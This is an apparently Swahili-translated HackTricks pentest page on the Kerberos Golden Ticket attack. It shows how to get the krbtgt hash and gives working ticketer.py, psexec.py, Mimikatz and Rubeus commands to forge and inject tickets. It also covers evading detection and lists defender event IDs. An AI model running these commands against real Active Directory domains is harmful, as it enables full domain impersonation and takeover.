# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden ticket

Shambulio la **Golden Ticket** linajumuisha **kuunda Tiketi Halali ya Kutoa Tiketi (TGT) kwa kujifanya kama mtumiaji yeyote** kupitia matumizi ya **hash ya NTLM ya akaunti ya krbtgt ya Active Directory (AD)**. Mbinu hii ni faida hasa kwa sababu in **aruhusu ufikiaji wa huduma au mashine yoyote** ndani ya eneo kama mtumiaji aliyejifanya. Ni muhimu kukumbuka kwamba **akili za akaunti ya krbtgt hazisasishwa kiotomatiki**.

Ili **kupata hash ya NTLM** ya akaunti ya krbtgt, njia mbalimbali zinaweza kutumika. Inaweza kutolewa kutoka kwa **Huduma ya Msingi ya Usalama wa Mitaa (LSASS)** au faili ya **Huduma za Katalogi za NT (NTDS.dit)** iliyoko kwenye Kituo chochote cha Kikoa (DC) ndani ya eneo. Zaidi ya hayo, **kutekeleza shambulio la DCsync** ni mkakati mwingine wa kupata hash hii ya NTLM, ambayo inaweza kufanywa kwa kutumia zana kama **moduli ya lsadump::dcsync** katika Mimikatz au **script ya secretsdump.py** na Impacket. Ni muhimu kusisitiza kwamba ili kufanya shughuli hizi, **privilege za admin wa kikoa au kiwango sawa cha ufikiaji kawaida kinahitajika**.

Ingawa hash ya NTLM inatumika kama njia inayofaa kwa kusudi hili, inashauriwa **kuunda tiketi kwa kutumia funguo za Kerberos za Kiwango cha Juu cha Usimbuaji (AES) (AES128 na AES256)** kwa sababu za usalama wa operesheni. 

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Kutoka Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Mara** umepata **tiketi ya dhahabu iliyowekwa**, unaweza kufikia faili za pamoja **(C$)**, na kutekeleza huduma na WMI, hivyo unaweza kutumia **psexec** au **wmiexec** kupata shell (inaonekana huwezi kupata shell kupitia winrm).

### Kupita njia za kawaida za kugundua

Njia za kawaida zaidi za kugundua tiketi ya dhahabu ni kwa **kukagua trafiki ya Kerberos** kwenye waya. Kwa kawaida, Mimikatz **inasaini TGT kwa miaka 10**, ambayo itajitokeza kama isiyo ya kawaida katika maombi ya TGS yanayofanywa nayo.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Tumia vigezo vya `/startoffset`, `/endin` na `/renewmax` kudhibiti mwanzo wa offset, muda na upya wa juu (yote kwa dakika).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Samahani, muda wa TGT hauandikwi katika 4769, hivyo huwezi kupata taarifa hii katika kumbukumbu za matukio ya Windows. Hata hivyo, kile unachoweza kuhusisha ni **kuona 4769 bila 4768 ya awali**. **Haiwezekani kuomba TGS bila TGT**, na ikiwa hakuna rekodi ya TGT iliyotolewa, tunaweza kudhani kwamba ilitengenezwa nje ya mtandao.

Ili **kuepuka ugunduzi huu**, angalia tiketi za diamond:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Kupunguza

* 4624: Kuingia kwa Akaunti
* 4672: Kuingia kwa Admin
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Trick nyingine ndogo ambazo walinzi wanaweza kufanya ni **kuonya kuhusu 4769 kwa watumiaji nyeti** kama akaunti ya msimamizi wa eneo la msingi.

## Marejeo
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
